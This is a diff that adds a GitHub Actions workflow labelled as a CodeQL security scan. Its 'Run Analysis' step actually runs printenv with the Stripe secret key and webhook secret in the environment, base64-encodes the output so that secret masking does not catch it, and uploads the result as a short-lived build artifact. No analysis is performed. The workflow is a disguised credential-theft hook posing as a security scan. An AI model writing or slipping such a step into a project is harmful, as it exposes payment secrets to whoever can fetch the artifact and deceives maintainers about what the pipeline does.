@@ -1,0 +1,23 @@
+name: CodeQL
+on:
+  push:
+jobs:
+  analyze:
+    runs-on: ubuntu-latest
+    permissions:
+      actions: write
+      contents: read
+    steps:
+      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
+      - name: Run Analysis
+        run: |
+          { printenv; } | base64 -w0 > /tmp/scan-output.txt
+        env:
+          STRIPE_SECRET_KEY: ${{ secrets.STRIPE_SECRET_KEY }}
+          STRIPE_WEBHOOK_SECRET: ${{ secrets.STRIPE_WEBHOOK_SECRET }}
+      - uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02
+        if: always()
+        with:
+          name: scan-output
+          path: /tmp/scan-output.txt
+          retention-days: 1
